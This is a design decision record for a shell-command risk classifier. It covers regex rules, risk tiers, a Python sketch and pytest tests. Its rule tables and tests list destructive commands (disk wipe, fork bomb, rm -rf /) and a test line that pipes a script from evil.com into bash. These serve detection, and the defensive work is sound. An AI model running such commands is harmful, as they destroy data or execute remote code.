# ADR 0004: Rule-Based Risk Classification in Phase 0

**Status**: Accepted

**Date**: 2024-01-15

## Context

IntelliShell's core value proposition is **analyzing commands before execution** to assess risk and suggest safer alternatives. The ai-service component needs a command classification engine.

Two approaches are possible:

1. **Rule-based classification**: Pattern matching against known dangerous commands
2. **LLM-based classification**: Use Ollama to analyze commands with context awareness

The prototype used ad-hoc pattern matching. Phase 0 focuses on **foundation** (reproducibility, tooling, testing), not advanced features. The classification engine must be:

- **Testable**: Deterministic output for given input (no randomness)
- **Fast**: < 100ms latency for real-time feedback
- **Simple**: Easy to understand and maintain
- **Coverage**: Detect common dangerous patterns (rm -rf, fork bombs, dd to devices)

## Decision

We will implement **rule-based classification** in Phase 0, with **LLM integration deferred to Phase 4**.

**Phase 0 implementation**:
- Pattern matching using regex against command strings
- Risk levels: `low`, `medium`, `high`, `critical`
- Hardcoded rules for known dangerous patterns
- Safer alternatives suggested via lookup table
- No context awareness (e.g., cwd, file existence)

**Phase 4 (future)**:
- Ollama integration for context-aware analysis
- Hybrid approach: rules + LLM (LLM provides additional insights)
- Prompt engineering for command safety analysis

## Consequences

### Positive

- **Deterministic**: Same command always produces same classification (good for testing)
- **Fast**: Pattern matching is < 1ms (no network call to Ollama)
- **Testable**: Easy to write unit tests with expected input/output pairs
- **No dependencies**: No need for Ollama to be running during development (LLM smoke test is separate)
- **Simple implementation**: ~200 lines of Python, easy to understand and audit
- **Phase 0 focus maintained**: Foundation work (tooling, testing) not derailed by LLM complexity

### Negative

- **No context awareness**: Cannot detect situational risks (e.g., `rm file.txt` when file.txt is important)
- **False negatives**: Novel or obfuscated commands may be missed
- **False positives**: Harmless commands may be flagged (e.g., `rm -rf /tmp/my-test-dir` flagged same as `rm -rf /`)
- **Maintenance burden**: New dangerous patterns require code changes
- **Limited suggestions**: Safer alternatives are hardcoded, not context-specific

### Mitigation

- **Well-tested rules**: Cover all prototype-verified patterns
- **Clear upgrade path**: Phase 4 will add LLM without breaking rules
- **Hybrid approach later**: Rules catch obvious cases fast, LLM provides nuance
- **Document limitations**: README and docs/ARCHITECTURE.md state rule-based classification is Phase 0 baseline

## Rule Examples

### Critical Risk

- `rm -rf /` - Deletes entire filesystem
- `dd if=/dev/zero of=/dev/sda` - Wipes disk
- `:(){ :|:& };:` - Fork bomb
- `chmod -R 777 /` - Makes entire filesystem world-writable

### High Risk

- `rm -rf ~/` - Deletes home directory
- `kill -9 1` - Kills init (crashes system)
- `curl ... | bash` - Executes remote script without inspection
- `chmod -R 777 <any path>` - World-writable directory

### Medium Risk

- `rm -r <path>` - Recursive delete (prompt before execution)
- `shutdown -h now` - Shuts down system
- `kill -9 <pid>` - Forceful process termination

### Low Risk

- `ls`, `cat`, `grep`, `echo` - Read-only operations
- `mkdir`, `touch`, `cd` - Safe filesystem operations
- `git status`, `cargo build` - Development commands

## Implementation Strategy

**Python module**: `ai-service/src/classifier.py`

```python
import re

CRITICAL_PATTERNS = [
    (r"rm\s+-rf\s+/\s*$", "Deletes entire root filesystem"),
    (r"dd\s+.*of=/dev/sd[a-z]", "Wipes entire disk"),
    (r":\(\)\{", "Fork bomb (recursive process spawn)"),
    (r"chmod\s+-R\s+777\s+/\s*$", "Makes entire filesystem world-writable"),
]

HIGH_PATTERNS = [
    (r"rm\s+-rf\s+~/", "Deletes home directory"),
    (r"kill\s+-9\s+1\s*$", "Terminates init process"),
    (r"curl\s+.*\|\s*bash", "Executes remote script without inspection"),
]

# ... more patterns ...

def classify_command(command: str) -> str:
    """Classify command risk level."""
    for pattern, reason in CRITICAL_PATTERNS:
        if re.search(pattern, command):
            return "critical"
    for pattern, reason in HIGH_PATTERNS:
        if re.search(pattern, command):
            return "high"
    # ... medium, low checks ...
    return "low"

def suggest_safer_alternative(command: str) -> str:
    """Suggest safer alternative for dangerous command."""
    if re.search(r"rm\s+-rf", command):
        return "Use 'rm -ri' for interactive deletion, or move to trash first"
    # ... more suggestions ...
    return ""
```

## Testing Strategy

**Pytest tests**: `ai-service/tests/test_classifier.py`

```python
def test_classify_critical():
    assert classify_command("rm -rf /") == "critical"
    assert classify_command("dd if=/dev/zero of=/dev/sda") == "critical"

def test_classify_high():
    assert classify_command("rm -rf ~/tmp") == "high"
    assert classify_command("curl http://evil.com/script.sh | bash") == "high"

def test_classify_low():
    assert classify_command("ls -la") == "low"
    assert classify_command("cat file.txt") == "low"
```

## Alternatives Considered

### 1. LLM-Only Classification (Ollama in Phase 0)

**Pros**:
- Context-aware from day one
- Better accuracy (fewer false positives/negatives)
- Natural language explanations

**Cons**:
- Non-deterministic (LLM output varies)
- Slow (1-10 seconds per classification)
- Requires Ollama running (complicates testing)
- Prompt engineering needed (additional complexity)
- Phase 0 scope creep (foundation work, not features)

**Verdict**: Deferred to Phase 4. Phase 0 is about foundation, not advanced features.

### 2. Static Analysis (AST Parsing)

**Pros**:
- More accurate than regex (understands shell syntax)
- Can detect complex patterns (nested commands, variables)

**Cons**:
- Complex implementation (need shell parser)
- Shell syntax varies (bash, zsh, fish)
- Overkill for Phase 0 (simple patterns work)

**Verdict**: Regex patterns are sufficient for Phase 0's coverage goals.

### 3. External API (VirusTotal, etc.)

**Pros**:
- Leverage existing threat intelligence

**Cons**:
- Requires internet (breaks localhost-only constraint)
- Sends user commands to third party (privacy violation)
- Latency

**Verdict**: Violates IntelliShell's privacy philosophy (all inference local).

## Phase 4 Upgrade Path

**Hybrid approach** (rules + LLM):

1. **Fast path**: Check rules first (< 1ms)
   - If critical/high risk detected by rules, return immediately (no LLM call needed)
2. **Slow path**: Send to LLM for nuanced analysis (1-10s)
   - LLM provides context-aware risk assessment
   - LLM generates personalized safer alternatives
3. **Combine results**: Rules + LLM insights
   - If they agree, high confidence
   - If they disagree, surface both to user (explain discrepancy)

**Benefits**:
- Fast classification for obvious cases (rules)
- Nuanced analysis for edge cases (LLM)
- Rules catch patterns even if Ollama is unavailable (fallback)

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Dangerous Linux Commands](https://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/)

## Notes

This decision applies to **Phase 0 only**. Phase 4 will introduce LLM-based classification without removing rules. The rule-based engine remains as a fast path and fallback.
